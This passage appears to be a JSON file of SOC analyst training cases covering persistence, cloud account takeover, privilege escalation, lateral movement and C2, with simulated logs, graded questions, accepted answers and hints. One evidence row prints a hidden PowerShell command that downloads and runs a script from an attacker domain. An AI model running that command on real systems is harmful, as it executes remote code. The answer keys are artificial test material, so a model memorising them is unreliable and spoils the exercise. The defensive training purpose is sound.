@@ -1,0 +1,440 @@
+[
+{
+ "id":17,"title":"Persistence Detection","domain":"Endpoint","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Persistence is anything that returns execution to the attacker after a reboot or a logoff. Windows offers dozens of mechanisms: Run and RunOnce keys, scheduled tasks, services, WMI event subscriptions, startup folders, DLL search-order hijacking, image file execution options, and accounts. Linux offers cron, systemd units and timers, rc scripts, shell profiles and SSH authorized_keys.",
+  "why":"Eradication fails if one mechanism survives. Attackers deliberately plant several of different types, expecting the obvious one to be found.",
+  "look":["Scheduled tasks whose action is a script interpreter or a binary in a user-writable path","Services created with a random or system-imitating name pointing outside System32","WMI __EventFilter and CommandLineEventConsumer pairs - stealthy and frequently missed","New SSH keys in authorized_keys, new systemd units, modified shell profiles","Anything created during the confirmed attack window"],
+  "fp":["Vendor software legitimately creates tasks, services and Run entries constantly","Group Policy deploys scheduled tasks estate-wide"],
+  "tips":["Enumerate by creation time, not by suspicion. Everything created during the attack window deserves a look.","WMI subscription persistence is invisible to a casual look at autoruns - check it explicitly."]
+ },
+ "case":{"id":"SOC-2026-00624","severity":"CRITICAL","alert":"Persistence hunt across confirmed compromised hosts","host":"WKS-2041 / SRV-FILE02 / SRV-LNX-04","time":"2026-03-04 16:00 UTC","source":"EDR / autoruns / journald","brief":"Enumerate every persistence mechanism the intruder established across the three confirmed hosts. Missing one means the eradication fails and the operator returns."},
+ "mitre":"T1547.001 Run Keys / T1053.005 Scheduled Task / T1546.003 WMI Subscription / T1543 Service",
+ "evidence":[
+  {"name":"WKS-2041 - Autoruns Snapshot","rows":[
+   "HKCU\\...\\Run\\WinUpdateSvc = %TEMP%\\svchost32.exe  created=2026-03-04T08:29:12Z signer=none",
+   "HKCU\\...\\Run\\OneDrive = C:\\Users\\k.rahman\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe created=2025-06-11 signer=Microsoft",
+   "Scheduled Task \\Microsoft\\Windows\\NWSync\\HealthCheck action=\"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://cdn-sync-delivery.net/h.ps1')\" trigger=daily 07:00 created=2026-03-04T09:20:44Z author=k.rahman",
+   "Scheduled Task \\Microsoft\\Windows\\UpdateOrchestrator\\Reboot action=usoclient.exe created=2024-01-02 author=SYSTEM",
+   "Startup folder: (empty)"
+  ]},
+  {"name":"SRV-FILE02 - Persistence Artefacts","rows":[
+   "Service name=NWSyncSvc display=\"Northwind Sync Service\" binpath=C:\\ProgramData\\nwsync.exe start=auto created=2026-03-04T09:46:10Z signer=none EventID=7045",
+   "Service name=VeeamTransportSvc binpath=\"C:\\Program Files\\Veeam\\Backup Transport\\x64\\VeeamTransport.exe\" created=2023-08-14 signer=\"Veeam Software\"",
+   "WMI __EventFilter name=\"NWHealthFilter\" query=\"SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" created=2026-03-04T09:52:31Z",
+   "WMI CommandLineEventConsumer name=\"NWHealthConsumer\" command=\"powershell.exe -w hidden -enc <blob>\" bound_to=NWHealthFilter created=2026-03-04T09:52:33Z",
+   "Run keys: none added since 2025"
+  ]},
+  {"name":"SRV-LNX-04 - Persistence Artefacts","rows":[
+   "crontab(deploy): */10 * * * * /tmp/.sysupd   created 2026-03-04T07:47Z",
+   "/home/deploy/.ssh/authorized_keys: 2 entries - key1 comment='ci-runner@build01' added 2024-03-02, key2 comment='root@localhost' added 2026-03-04T07:49Z",
+   "systemd units modified in last 7 days: none",
+   "/etc/rc.local: not present",
+   "~/.bashrc: unmodified (checksum matches baseline)"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"How many attacker persistence mechanisms exist in total across the three hosts?","type":"num","accept":["6"],"hint":"Count only artefacts created on 2026-03-04 by the intrusion: two on WKS-2041, two on SRV-FILE02, two on SRV-LNX-04."},
+  {"id":"q2","label":"Name of the malicious scheduled task on WKS-2041","type":"keywords","accept":["healthcheck","nwsync\\healthcheck","nwsync"],"hint":"One task was created during the attack window and downloads a script."},
+  {"id":"q3","label":"Name of the malicious service on SRV-FILE02","type":"exact","accept":["nwsyncsvc"],"hint":"Look for a 7045 service creation with an unsigned binary in ProgramData."},
+  {"id":"q4","label":"Which Windows Event ID records service installation?","type":"exact","accept":["7045"],"hint":"It appears explicitly on the service line."},
+  {"id":"q5","label":"Which persistence type on SRV-FILE02 is most likely to be missed by a routine check?","type":"choice","options":["WMI event subscription","Run key","Startup folder shortcut","Scheduled task"],"accept":["wmi event subscription"],"hint":"One mechanism is not visible in the usual autoruns locations at all."},
+  {"id":"q6","label":"What persistence did the attacker add to the Linux host besides cron?","type":"keywords","accept":["ssh key","authorized_keys","public key","key2","ssh"],"hint":"Compare the two authorized_keys entries and their dates."},
+  {"id":"q7","label":"Which artefact on WKS-2041 is legitimate and must NOT be removed?","type":"keywords","accept":["onedrive","updateorchestrator","usoclient"],"hint":"Two entries predate the incident and are signed."},
+  {"id":"q8","label":"Why does the scheduled task represent re-infection risk even after the loader is deleted?","type":"keywords","accept":["download","re-download","redownload","fetch","again","reinstall","recreate","c2","internet"],"hint":"Read what the task's action actually does when it fires at 07:00."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["remove","delete","eradicat","rebuild","reimage","revoke","disable"],"text":"Remove all six mechanisms in one coordinated action (Run value, scheduled task, service, WMI filter/consumer pair, cron entry, rogue SSH key), then verify with a second sweep; preserve copies first and prefer rebuild for SRV-FILE02."},
+ "timelineKey":["08:29:12","09:20:44","09:46:10","09:52:31"],
+ "hints":["Sort every artefact by creation date and ignore everything that predates 2026-03-04. The attack window does the filtering for you.","Each host has two mechanisms, not one. On SRV-FILE02 the second one is a pair of WMI objects that only make sense together."],
+ "review":"Six mechanisms, deliberately varied so that finding one does not reveal the rest: on WKS-2041 the HKCU Run value and a scheduled task that re-downloads a script from the C2 daily at 07:00; on SRV-FILE02 an auto-start service (7045, unsigned binary in ProgramData) plus a WMI __EventFilter and CommandLineEventConsumer pair, which is the one most teams miss because it does not appear in normal startup locations; on SRV-LNX-04 the ten-minute cron and a second SSH key added at 07:49 with the misleading comment root@localhost. The OneDrive Run entry, the UpdateOrchestrator task, the Veeam service and the 2024 CI key are legitimate. Removal must be coordinated - clean one host while the others still beacon and the operator simply redeploys.",
+ "next":"Persistence is mapped. Now account for the identities: the operator has been using more than one set of credentials, and at least one user account is behaving in ways its owner cannot explain."
+},
+{
+ "id":18,"title":"Account Compromise","domain":"Identity","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Account compromise investigation compares observed identity behaviour against a behavioural baseline: where the account normally authenticates from, at what hours, to what resources, and with what device. Cloud identity platforms add session, device and MFA telemetry. Key anomalies are impossible travel, MFA fatigue, new device registration and session token reuse.",
+  "why":"Once credentials are valid, nothing looks like an exploit. Identity telemetry is often the only place the intrusion is visible.",
+  "look":["Sign-ins from an ASN or country the user has never used, especially within an impossible interval of a legitimate one","Repeated MFA prompts followed by one approval - push-bombing","New MFA method or device registered by the user shortly after a suspicious sign-in","Mailbox rules created to auto-delete or forward - a standard post-compromise move","Legacy authentication protocols that bypass MFA entirely"],
+  "fp":["VPNs, mobile roaming and cloud gateways produce genuine geo anomalies","Users do travel - check the calendar and the ticket queue before declaring impossible travel"],
+  "tips":["Check for a new MFA method registration. If the attacker registers their own, a password reset alone will not evict them.","Mailbox rule creation is one of the highest-fidelity business-email-compromise indicators."]
+ },
+ "case":{"id":"SOC-2026-00637","severity":"CRITICAL","alert":"Identity platform: atypical sign-in and MFA anomaly for m.chen","host":"Cloud identity / Exchange Online","time":"2026-03-04 to 2026-03-05","source":"Identity provider sign-in logs / mailbox audit","brief":"m.chen executed the phishing .lnk yesterday. Determine whether her identity has been compromised in the cloud as well as on the endpoint, and what the attacker did with it."},
+ "mitre":"T1078.004 Valid Accounts: Cloud / T1621 MFA Request Generation / T1114 Email Collection",
+ "evidence":[
+  {"name":"Sign-in Logs - m.chen","rows":[
+   "2026-03-04 08:55:02 IP=10.20.4.55 (Karachi office) device=WKS-2044 mfa=satisfied(compliant device) result=success app=Outlook",
+   "2026-03-04 22:41:10 IP=91.203.5.61 (NL, ASN 64502) device=unknown mfa=push_sent result=denied_by_user",
+   "2026-03-04 22:41:55 IP=91.203.5.61 device=unknown mfa=push_sent result=denied_by_user",
+   "2026-03-04 22:42:40 IP=91.203.5.61 device=unknown mfa=push_sent result=denied_by_user",
+   "2026-03-04 22:43:25 IP=91.203.5.61 device=unknown mfa=push_sent result=denied_by_user",
+   "2026-03-04 22:44:09 IP=91.203.5.61 device=unknown mfa=push_sent result=denied_by_user",
+   "2026-03-04 22:45:02 IP=91.203.5.61 device=unknown mfa=push_sent result=SUCCESS app=\"Exchange Web Services\"",
+   "2026-03-04 22:47:31 IP=91.203.5.61 action=register_mfa_method method=\"Authenticator app (device: SM-A125)\" result=success",
+   "2026-03-05 01:12:00 IP=91.203.5.61 app=\"Exchange Web Services\" result=success (no MFA prompt - existing session token)",
+   "2026-03-05 08:02:14 IP=10.20.4.55 device=WKS-2044 mfa=satisfied result=success app=Outlook"
+  ]},
+  {"name":"Mailbox Audit - m.chen","rows":[
+   "2026-03-04 22:49:02 New-InboxRule name=\"...\" from=91.203.5.61 conditions=\"subject contains: invoice, payment, bank, IT, security\" action=\"MoveToFolder: RSS Subscriptions; MarkAsRead\"",
+   "2026-03-04 22:53:40 MailItemsAccessed count=412 folder=Inbox,Sent client=ExchangeWebServices from=91.203.5.61",
+   "2026-03-05 01:15:22 MailItemsAccessed count=180 folder=\"Finance Approvals\" from=91.203.5.61",
+   "2026-03-05 01:31:05 Send from=91.203.5.61 to=accounts@northwind-freight.com subject=\"Updated remittance details - Q1 vendor payments\""
+  ]},
+  {"name":"User Context","rows":[
+   "m.chen: Finance Analyst, Karachi. Historic sign-in countries: PK only (24 months). Normal hours 08:00-18:00 PKT.",
+   "Registered MFA methods before incident: 1 (Authenticator on device SM-G990, registered 2024-05-02)",
+   "m.chen reports: 'My phone kept asking me to approve something around 3:40am local time. I pressed approve to make it stop.'",
+   "91.203.5.61 -> same /24 as C2 (91.203.5.12) and phishing relay (91.203.5.44)"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Attacker source IP in the sign-in logs","type":"exact","accept":["91.203.5.61"],"hint":"One address appears on every anomalous event."},
+  {"id":"q2","label":"How many MFA pushes were denied before one was approved?","type":"num","accept":["5"],"hint":"Count the denied_by_user results before the SUCCESS."},
+  {"id":"q3","label":"Name of this technique","type":"choice","options":["MFA fatigue / push bombing","Password spraying","Golden ticket","Session hijacking via XSS"],"accept":["mfa fatigue / push bombing"],"hint":"Repeated prompts until the user approves one to stop the noise."},
+  {"id":"q4","label":"What did the attacker register at 22:47 and why does it matter?","type":"keywords","accept":["mfa","authenticator","second factor","method","device","sm-a125"],"hint":"Consider what survives a simple password reset."},
+  {"id":"q5","label":"What did the inbox rule do?","type":"keywords","accept":["move","rss","hide","mark as read","hidden","folder","conceal"],"hint":"Read the action field - the destination folder is chosen because nobody looks in it."},
+  {"id":"q6","label":"Why did the attacker choose those rule keywords?","type":"keywords","accept":["hide","conceal","security","notification","alert","warning","it","fraud","invoice","payment","detect"],"hint":"Which incoming emails would most likely warn the user or the SOC that something is wrong?"},
+  {"id":"q7","label":"How many mail items were accessed in total?","type":"num","accept":["592"],"hint":"Add the two MailItemsAccessed counts together."},
+  {"id":"q8","label":"What is the likely purpose of the 01:31 outbound email?","type":"choice","options":["Business email compromise / payment fraud","Out-of-office notification","Legitimate vendor update","Phishing awareness test"],"accept":["business email compromise / payment fraud"],"hint":"Consider the recipient, the subject and who the sender appears to be."},
+  {"id":"q9","label":"Is the 2026-03-05 08:02 sign-in from WKS-2044 malicious? (yes/no)","type":"exact","accept":["no"],"hint":"Compare its IP, device and MFA state with the user's baseline."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["revoke","session","token","reset","remove mfa","disable","recall","block","notify"],"text":"Revoke all sessions and refresh tokens, reset the password, remove the attacker-registered MFA method, delete the inbox rule, recall/report the fraudulent email to the partner, and block the 91.203.5.0/24 range."},
+ "timelineKey":["22:41:10","22:45:02","22:47:31","22:49:02","01:31:05"],
+ "hints":["Read the sign-in log as a sequence of attempts rather than individual events. What changed between the fifth attempt and the sixth, and what did the attacker do immediately after getting in?","Two actions after the successful sign-in are designed to outlast your response: one keeps the attacker's access, the other keeps the user from noticing. Find both."],
+ "review":"Classic cloud account takeover. Five MFA pushes at roughly 45-second intervals at 03:40 local time until the user approved one to stop the noise, then immediate registration of the attacker's own authenticator device (SM-A125) - which is why a password reset alone would not evict them. An inbox rule was created to move any mail mentioning invoice, payment, bank, IT or security into RSS Subscriptions and mark it read, concealing both fraud replies and security warnings. 592 mail items were accessed across the inbox, sent items and Finance Approvals, followed by a fraudulent remittance-details email to a genuine partner - business email compromise. The 01:12 access needed no MFA because the session token was already valid, which is why token revocation must accompany the reset. The morning sign-in from her own device is the real user.",
+ "next":"The attacker holds a finance identity and a foothold on three hosts. The next question is whether they have gained administrative rights anywhere they should not have them."
+},
+{
+ "id":19,"title":"Privilege Escalation Detection","domain":"Windows","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Privilege escalation moves an attacker from the rights they have to the rights they want. On Windows the common routes are credential theft from memory, abusing over-permissive service or scheduled task configurations, unquoted service paths, token impersonation, exploiting a vulnerable driver, and simply adding an account to a privileged group. On Linux: sudo misconfiguration, SUID binaries, writable service units and kernel exploits.",
+  "why":"Escalation is the hinge of an intrusion. Before it, damage is bounded by one user's rights; after it, the attacker owns the estate.",
+  "look":["4672 (special privileges assigned) for accounts that should never have them","4732/4728 group membership additions outside change control","Service binary paths or permissions modified by a non-admin account","Token manipulation: a process running with higher integrity than its parent","Linux: new SUID binaries, sudoers edits, unexpected 'USER=root' sudo entries"],
+  "fp":["Administrators legitimately trigger 4672 every time they log on","Installers modify service configurations as part of normal upgrades"],
+  "tips":["Compare integrity level between parent and child - Medium spawning High without a UAC prompt is a finding.","A group membership change is a five-second action with permanent consequences; audit it hourly during an incident."]
+ },
+ "case":{"id":"SOC-2026-00648","severity":"CRITICAL","alert":"Integrity-level elevation and service configuration change on compromised host","host":"SRV-FILE02","time":"2026-03-04 09:40-10:20 UTC","source":"EDR / Windows Security / Sysmon","brief":"Determine how the attacker escalated from a standard user context to SYSTEM on the finance file server, and whether they achieved domain-level privilege."},
+ "mitre":"T1068 / T1574.011 Service Registry Permissions Weakness / T1134 Token Manipulation",
+ "evidence":[
+  {"name":"Sysmon / EDR - SRV-FILE02","rows":[
+   "09:40:12 proc=nwsync.exe pid=5120 user=CORP\\m.chen integrity=Medium parent=explorer.exe",
+   "09:41:02 proc=nwsync.exe cmd=\"sc qc BackupMgrSvc\" -> output: BINARY_PATH_NAME=C:\\Program Files\\BackupMgr\\bin\\svc.exe SERVICE_START_NAME=LocalSystem",
+   "09:41:30 proc=nwsync.exe action=file_permission_check path=\"C:\\Program Files\\BackupMgr\\bin\\\" result=\"BUILTIN\\Users:(M)\" (modify rights for all users)",
+   "09:42:05 proc=nwsync.exe action=file_write path=\"C:\\Program Files\\BackupMgr\\bin\\svc.exe\" sha256=d92e77b3f1a0... (replaced original, original renamed svc.exe.bak)",
+   "09:43:00 proc=services.exe action=service_restart name=BackupMgrSvc (triggered by scheduled maintenance restart)",
+   "09:43:02 proc=svc.exe pid=5340 user=NT AUTHORITY\\SYSTEM integrity=System parent=services.exe signer=none",
+   "09:44:18 proc=svc.exe action=process_access target=lsass.exe access=PROCESS_VM_READ (no known security product)",
+   "09:45:40 proc=svc.exe cmd=\"net group \\\"Domain Admins\\\" /domain\"",
+   "09:46:10 proc=svc.exe action=service_create name=NWSyncSvc binpath=C:\\ProgramData\\nwsync.exe",
+   "10:18:44 EventID=4672 Account=svc_backup2 Privileges=SeDebugPrivilege,SeTcbPrivilege Host=SRV-FILE02"
+  ]},
+  {"name":"Configuration Review","rows":[
+   "BackupMgrSvc installed 2021 by vendor; directory ACL grants BUILTIN\\Users modify - known vendor installation defect, unpatched",
+   "Service runs as LocalSystem and restarts nightly and on maintenance triggers",
+   "Original svc.exe signer=\"BackupMgr Software Ltd\" ; replacement signer=none, same filename and icon",
+   "m.chen is not a local administrator on SRV-FILE02 and holds no privileged group membership"
+  ]},
+  {"name":"Comparison Events","rows":[
+   "09:15:00 EventID=4672 Account=adm.tovar Privileges=SeSecurityPrivilege,SeBackupPrivilege Host=SRV-APP03 (routine admin logon)",
+   "08:00:00 EventID=4672 Account=svc_sql Privileges=SeServiceLogonRight Host=SRV-SQL01 (service start, daily)"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Which service did the attacker abuse?","type":"exact","accept":["backupmgrsvc","backupmgr"],"hint":"One service is queried with sc qc immediately before the escalation."},
+  {"id":"q2","label":"What weakness made the abuse possible?","type":"keywords","accept":["permission","acl","writable","modify","users:(m)","weak","directory","write access"],"hint":"Read the file_permission_check result - which group has modify rights where it should not?"},
+  {"id":"q3","label":"What account does that service run as?","type":"keywords","accept":["localsystem","system","nt authority\\system"],"hint":"Read SERVICE_START_NAME from the sc qc output."},
+  {"id":"q4","label":"Escalation technique","type":"choice","options":["Service binary replacement (weak folder permissions)","Kerberoasting","DLL side-loading into Office","Exploiting an unpatched kernel driver"],"accept":["service binary replacement (weak folder permissions)"],"hint":"Track what was written to disk at 09:42 and what executed at 09:43."},
+  {"id":"q5","label":"At what integrity level did the attacker's code run after escalation?","type":"keywords","accept":["system","high","nt authority\\system"],"hint":"Compare the integrity field at 09:40:12 with the one at 09:43:02."},
+  {"id":"q6","label":"What did the escalated process do to LSASS?","type":"keywords","accept":["read","credential","dump","memory","process_vm_read","access memory","harvest"],"hint":"Read the 09:44:18 event - and note that unlike the SRV-APP03 case, this binary is unsigned with no ticket."},
+  {"id":"q7","label":"Which account shows domain-level privilege on this host at 10:18?","type":"exact","accept":["svc_backup2"],"hint":"Check the 4672 event on SRV-FILE02 - the account should be familiar from an earlier case."},
+  {"id":"q8","label":"Is the 09:15 adm.tovar 4672 event part of the attack? (yes/no)","type":"exact","accept":["no"],"hint":"Compare the host, account type and context with the comparison events panel."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["isolate","restore","acl","permission","reset","krbtgt","rebuild","revoke","contain"],"text":"Isolate SRV-FILE02, restore the original signed service binary and correct the directory ACL, treat all credentials cached on the host as compromised and reset them, and re-audit Domain Admins membership."},
+ "timelineKey":["09:41:02","09:42:05","09:43:02","09:44:18"],
+ "hints":["Escalation here required no exploit at all. Follow the sequence: query a service, check whether its folder is writable, replace the binary, wait for a restart.","The proof of escalation is a single field changing value between two events on the same code. Find the field that reads Medium in one place and System in another."],
+ "review":"No exploit was needed. nwsync.exe, running as m.chen at Medium integrity, queried BackupMgrSvc, found that BUILTIN\\Users held modify rights on its program directory - a 2021 vendor installation defect that was never remediated - replaced the signed service binary with its own, and waited for the scheduled restart. At 09:43:02 the same code was running as NT AUTHORITY\\SYSTEM, launched by services.exe. From there it read LSASS memory (unsigned binary, no ticket, no admin account - the exact opposite of the SRV-APP03 false positive), enumerated Domain Admins, and installed the NWSyncSvc persistence service. By 10:18 svc_backup2, the backdoor domain account from the DC-01 case, was exercising SeDebugPrivilege on this host: the two intrusion paths have converged. Every credential cached on this server must now be treated as stolen.",
+ "next":"With SYSTEM on a file server and a Domain Admin backdoor, the operator can move anywhere. Track their movement between hosts."
+},
+{
+ "id":20,"title":"Lateral Movement Detection","domain":"Windows","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"Lateral movement is authenticated access from one host to another using stolen credentials. The common methods each leave a recognisable signature: remote service creation (PsExec: 7045 plus admin share access), WMI and WinRM execution, RDP (Type 10 logons), scheduled task creation on a remote host, and pass-the-hash producing NTLM network logons without a preceding Kerberos ticket request.",
+  "why":"Movement is where a contained incident becomes an estate-wide one. Detecting it early limits how much has to be rebuilt.",
+  "look":["4648 - logon with explicitly supplied credentials, the classic runas/lateral indicator","4624 Type 3 with NTLM where the environment is otherwise Kerberos","7045 service installed with a random-looking name, or a binary in ADMIN$","5140/5145 access to ADMIN$, C$ and IPC$ shares","Sequences of the same account authenticating to many hosts in a short window"],
+  "fp":["Administrative tooling, patch deployment and monitoring all authenticate widely by design","Backup agents access administrative shares routinely"],
+  "tips":["Build the movement graph: source host, destination host, account, method, time. That graph is the containment plan.","Count distinct destinations per account in an hour - humans and scripts have very different shapes."]
+ },
+ "case":{"id":"SOC-2026-00659","severity":"CRITICAL","alert":"Remote service creation and administrative share access across multiple hosts","host":"Estate","time":"2026-03-04 10:20-11:40 UTC","source":"Windows Security / Sysmon / SMB audit","brief":"Map the attacker's movement through the estate: which accounts, which methods, which destinations, and identify the one host where movement was attempted but failed."},
+ "mitre":"T1021.002 SMB/Admin Shares / T1569.002 Service Execution / T1021.001 RDP",
+ "evidence":[
+  {"name":"Authentication and Movement Events","rows":[
+   "10:20:11 SRV-FILE02 EventID=4648 Subject=SYSTEM TargetAccount=svc_backup2 TargetServer=SRV-HR01 Process=svc.exe",
+   "10:20:14 SRV-HR01 EventID=4624 Account=svc_backup2 LogonType=3 AuthPackage=NTLM SourceIP=10.20.8.22(SRV-FILE02)",
+   "10:20:15 SRV-HR01 EventID=5140 ShareName=\\\\*\\ADMIN$ Account=svc_backup2 SourceIP=10.20.8.22",
+   "10:20:22 SRV-HR01 EventID=7045 ServiceName=PSEXESVC BinaryPath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem",
+   "10:21:40 SRV-HR01 proc=cmd.exe parent=PSEXESVC.exe user=SYSTEM cmd=\"cmd /c net user /domain > \\\\SRV-FILE02\\C$\\temp\\u.txt\"",
+   "10:44:02 SRV-FILE02 EventID=4648 Subject=SYSTEM TargetAccount=svc_backup2 TargetServer=SRV-SQL01 Process=svc.exe",
+   "10:44:06 SRV-SQL01 EventID=4624 Account=svc_backup2 LogonType=3 AuthPackage=NTLM SourceIP=10.20.8.22",
+   "10:44:30 SRV-SQL01 EventID=7045 ServiceName=PSEXESVC BinaryPath=%SystemRoot%\\PSEXESVC.exe",
+   "11:02:55 SRV-FILE02 EventID=4648 Subject=SYSTEM TargetAccount=svc_backup2 TargetServer=DC-01 Process=svc.exe",
+   "11:02:58 DC-01 EventID=4624 Account=svc_backup2 LogonType=3 AuthPackage=NTLM SourceIP=10.20.8.22 Status=Success",
+   "11:03:40 DC-01 EventID=4662 Account=svc_backup2 Operation=DS-Replication-Get-Changes-All ObjectType=domainDNS",
+   "11:31:10 SRV-FILE02 EventID=4648 Subject=SYSTEM TargetAccount=svc_backup2 TargetServer=SRV-PCI01 Process=svc.exe",
+   "11:31:12 SRV-PCI01 EventID=4625 Account=svc_backup2 LogonType=3 SubStatus=0xC000015B (logon type not granted)",
+   "11:31:18 SRV-PCI01 EventID=4625 Account=svc_backup2 LogonType=3 SubStatus=0xC000015B",
+   "09:30:00 SRV-APP03 EventID=4624 Account=svc_sccm LogonType=3 SourceIP=10.20.8.40 (patch deployment, 62 hosts, daily)"
+  ]},
+  {"name":"Asset and Control Context","rows":[
+   "SRV-HR01 = HR records server | SRV-SQL01 = finance database | SRV-PCI01 = cardholder data environment, segmented, deny-by-default, tiered admin model enforced",
+   "SRV-PCI01 policy: 'Deny access to this computer from the network' applied to all non-PCI accounts (this is why 0xC000015B is returned)",
+   "svc_sccm = endpoint management service account, expected to authenticate to all workstations daily from 10.20.8.40",
+   "4662 with DS-Replication-Get-Changes-All = directory replication rights being exercised (DCSync)"
+  ]}
+ ],
+ "questions":[
+  {"id":"q1","label":"Which account is the attacker using for movement?","type":"exact","accept":["svc_backup2"],"hint":"One account appears as TargetAccount on every 4648 event."},
+  {"id":"q2","label":"Which host is the movement source?","type":"exact","accept":["srv-file02","file02","10.20.8.22"],"hint":"Check the SourceIP on the destination 4624 events."},
+  {"id":"q3","label":"Which service name reveals the movement tool?","type":"exact","accept":["psexesvc","psexec"],"hint":"Look at the 7045 events on the destination hosts."},
+  {"id":"q4","label":"How many hosts did the attacker successfully move to?","type":"num","accept":["3"],"hint":"Count destinations with a successful 4624 - one destination returned 4625 instead."},
+  {"id":"q5","label":"Which host successfully blocked the movement?","type":"exact","accept":["srv-pci01","pci01"],"hint":"Find the destination where the logon failed with 0xC000015B."},
+  {"id":"q6","label":"Why did that host block it?","type":"keywords","accept":["segment","deny","policy","tier","logon right","not granted","network access","hardened","restricted"],"hint":"Read the control context entry for that server."},
+  {"id":"q7","label":"What is the significance of the 11:03:40 event on DC-01?","type":"choice","options":["DCSync - replicating credential material from Active Directory","Normal domain replication between DCs","Group Policy refresh","Certificate enrolment"],"accept":["dcsync - replicating credential material from active directory"],"hint":"Read the operation name and the context note about replication rights."},
+  {"id":"q8","label":"Is the 09:30 svc_sccm activity lateral movement? (yes/no)","type":"exact","accept":["no"],"hint":"Compare its source, schedule and account purpose with the attacker pattern."}
+ ],
+ "decision":"true_positive","severity_answer":"CRITICAL",
+ "recommend":{"any":["krbtgt","reset","isolate","disable","segment","contain","rebuild","escalate"],"text":"Treat the domain as fully compromised: disable svc_backup2, isolate SRV-FILE02/HR01/SQL01, plan a double krbtgt reset and enterprise-wide credential rotation, and preserve DC-01 for forensics."},
+ "timelineKey":["10:20:11","10:44:02","11:02:58","11:03:40","11:31:12"],
+ "hints":["Every movement in this log follows the same four-event shape: explicit credentials, a network logon, an admin share, a new service. Find that shape and count how many times it completes.","One destination answered with a failure code that is not a bad password. Look up what 0xC000015B means and which host returned it."],
+ "review":"The attacker moved from SRV-FILE02 using svc_backup2 with PsExec: 4648 explicit credentials, NTLM Type 3 logon, ADMIN$ access, PSEXESVC service installation - repeated against SRV-HR01, SRV-SQL01 and DC-01. On the domain controller at 11:03:40 they exercised DS-Replication-Get-Changes-All, which is DCSync: the attacker can now replicate password hashes for every account in the domain, including krbtgt. That is a full domain compromise and a double krbtgt reset is required. SRV-PCI01 refused them twice with 0xC000015B - not a wrong password, but 'logon type not granted', because the segmented cardholder environment denies network logon to non-PCI accounts. That single control is the only thing that kept the PCI scope out of the incident, and it belongs in the report as the one defence that worked. The svc_sccm activity is daily patch deployment.",
+ "next":"The operator now has directory-level control and three beaconing implants. Characterise their command-and-control infrastructure in full before the block list goes to the network team."
+},
+{
+ "id":21,"title":"Command & Control","domain":"Network","tier":"Tier 2","tierNote":"Supervised Tier-2 exposure",
+ "theory":{
+  "concept":"C2 is the channel between implant and operator. Analysts classify it by transport (HTTP/S, DNS, SMB named pipes, cloud services), by cadence (fixed interval, jitter, long sleep) and by architecture (direct, redirector, domain fronting, peer-to-peer through an internal pivot). Modern frameworks randomise timing and blend into normal traffic, so detection leans on aggregation over time.",
+  "why":"Blocking one address rarely ends the intrusion. Mapping every channel, including internal pivots, is what makes the block effective.",
+  "look":["Regular intervals once jitter is averaged out; compute the mean and the variance","Consistent small payload sizes in both directions","Long sleep implants that only wake every few hours - easy to miss on a one-hour view","Internal hosts relaying for hosts that have no direct internet path (SMB pipe or HTTP proxy pivot)","Repeated TLS fingerprints (JA3) or certificate serials across unrelated destinations"],
+  "fp":["Monitoring agents, update services and chat clients all beacon legitimately","Cloud-hosted C2 shares addresses with legitimate services - block by domain and fingerprint, not only by IP"],
+  "tips":["Average the intervals rather than eyeballing them; jitter is designed to defeat eyeballing.","Ask how every compromised host reaches the internet. A host with no route must be pivoting through one that has."]
+ },
+ "case":{"id":"SOC-2026-00668","severity":"CRITICAL","alert":"Full C2 channel characterisation prior to coordinated block","host":"WKS-2041 / SRV-FILE02 / SRV-LNX-04 / SRV-HR01","time":"2026-03-04 08:00 - 03-05 06:00","source":"NetFlow / proxy / Zeek / EDR","brief":"Map every command-and-control channel in use, including any internal relay. The network team executes your block list in one action - anything you miss keeps the operator connected."},
+ "mitre":"T1071.001 Web Protocols / T1071.004 DNS / T1090.001 Internal Proxy / T1573 Encrypted Channel",
+ "evidence":[
+  {"name":"External Channels","rows":[
+   "WKS-2041 -> 91.203.5.12:8443 HTTPS POST /gate.php interval~600s jitter=+/-12s ja3=51c64c77e60f3980eea90869b68c58a8 cert=self-signed CN=localhost",
+   "SRV-LNX-04 -> 91.203.5.12:8443 HTTPS POST /gate.php interval~600s jitter=+/-9s ja3=51c64c77e60f3980eea90869b68c58a8",
+   "SRV-FILE02 -> datasync-77x.net TXT queries ~1/s burst windows 10:02-10:34, 14:10-14:38, 22:05-22:41 (DNS tunnel)",
+   "SRV-FILE02 -> 91.203.5.12:8443 HTTPS POST /gate.php interval~3600s jitter=+/-180s (long-sleep secondary channel)",
+   "SRV-HR01 -> no direct external connections observed (egress policy: servers in 10.20.9.0/24 have no internet route)"
+  ]},
+  {"name":"Internal Channels","rows":[
+   "SRV-HR01 -> SRV-FILE02:445 named pipe \\\\.\\pipe\\nwsync_9f21 sessions every ~600s, 400-900 bytes, 10:22 onwards",
+   "SRV-SQL01 -> SRV-FILE02:445 named pipe \\\\.\\pipe\\nwsync_9f21 sessions every ~600s, 10:46 onwards",
+   "SRV-FILE02 is the only compromised host with both an internet route and internal server-VLAN reachability"
+  ]},
+  {"name":"Infrastructure Enrichment","rows":[
+   "91.203.5.12 (C2), 91.203.5.44 (phishing relay), 91.203.5.61 (cloud sign-ins) - all ASN 64502, same /24",
+   "cdn-sync-delivery.net, datasync-77x.net, nw-freight-portal.net - all created 2026-02-24, nameservers ns1/ns2.dyn-fastns.net",
+   "ja3 51c64c77... also observed 2026-01-18 in an unrelated Northwind subsidiary incident attributed to TA-4411",
